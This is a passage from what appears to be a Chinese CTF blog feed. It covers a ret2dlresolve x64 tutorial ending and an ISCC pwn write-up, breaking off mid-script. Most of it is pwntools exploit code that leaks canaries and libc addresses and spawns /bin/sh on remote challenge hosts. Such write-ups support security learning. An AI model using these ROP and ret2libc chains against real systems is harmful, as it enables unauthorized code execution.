(symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, <span class="string">&quot;system&quot;</span>,elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)))  </span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"><span class="comment"># send resolve data</span></span><br><span class="line">io.send(resolve_data)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bin_sh_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bin_sh_addr,<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak link_map addr</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;write&#x27;</span>],<span class="number">1</span>,<span class="number">0x601008</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>) <span class="comment"># 0x00000000004007a3: pop rdi; ret; </span></span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line"><span class="comment"># rop.raw(&#x27;a&#x27;*(256-len(rop.chain())))</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然而，还是崩溃。但这次比较好的是，确实已经执行到了 system 函数。通过调试，我们可以发现，system 函数在进一步调用 execve 时出现了问题</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-04_22-13-10.png" alt="1"></p><p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p><p>首先，我们可以把读伪造的数据和 &#x2F;bin&#x2F;sh 部分的 rop 合并起来，以减少 ROP 的次数</p><p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据’a’。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p></blockquote><p>最终完整的exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28162</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">show = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx =r15</span></span><br><span class="line">    payload=p64(csu_end_addr)</span><br><span class="line">    payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf,store_addr,func_name,resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    </span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    </span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment">#重定位表大小</span></span><br><span class="line">    </span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment">#符号表大小</span></span><br><span class="line">    </span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创造fake函数字符</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创造fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)//<span class="number">24</span></span><br><span class="line">    resolve_data += <span class="string">b&#x27;\x00&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#创造fake reloc</span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset%relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)//<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data += <span class="string">b&#x27;\x00&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line">    </span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data,resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome to CTFshowPWN!\n&quot;</span>)</span><br><span class="line">store_addr = bss_addr + <span class="number">0x100</span></span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创造fake string,symbol,修改.dynamic部分中的.dynstr指针到特定位置。</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">resolve_data,resolve_call = ret2dlresolve_x64(elf,store_addr,<span class="string">b&quot;system&quot;</span>,elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)+<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"></span><br><span class="line">io.send(resolve_data+sh)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = store_addr + <span class="built_in">len</span>(resolve_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露link_map addr</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;write&#x27;</span>],<span class="number">1</span>,<span class="number">0x601008</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(show)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] = NULL</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(show)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">rop.raw(pop_rdi)</span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里又遇到一个问题，在最后一段rop如果是远程环境偏移不变，如果是本地环境偏移就要对应减8，暂时还没有发现原因</p><p>小结：</p><p>这篇文章断断续续写了快3个星期(最近有点偷懒了)目前的掌握程度还不深要靠实战来加深，加油！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iscc wp</title>
      <link href="/2025/05/01/iscc/"/>
      <url>/2025/05/01/iscc/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签"><a href="#签" class="headerlink" title="签"></a>签</h2><p>开了canary，可以用printf泄露canary后面直接打libc就好了</p><p>libc：<a href="https://libc.blukat.me/?q=puts:880&l=libc6-i386_2.35-0ubuntu3.9_amd64">libc database search</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;192.168.9.151&#x27;,55097)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12400</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">canary=u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xC</span> + p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;?\n&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">canary=u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xC</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>给了libc开了canary和nx</p><p>首先要让key变为520，然后漏洞函数和上一题逻辑一样，这里没搞懂是怎么改变prt的</p><p>fg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">fg</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( key != <span class="number">520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x64</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = ptr;</span><br><span class="line">    *ptr = <span class="string">&#x27;galf&#x27;</span>;</span><br><span class="line">    v0[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2) != <span class="number">1</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">1024</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">&quot;Invalid size\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0xD</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    v4 = <span class="built_in">malloc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(ptr, <span class="string">&quot;flag&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">      key = <span class="number">520</span>;</span><br><span class="line">    <span class="built_in">free</span>(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;192.168.9.151&#x27;,55097)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12200</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b main&quot;)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4014c3</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;flag:&#x27;</span>,<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;welcome to ISCC&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span 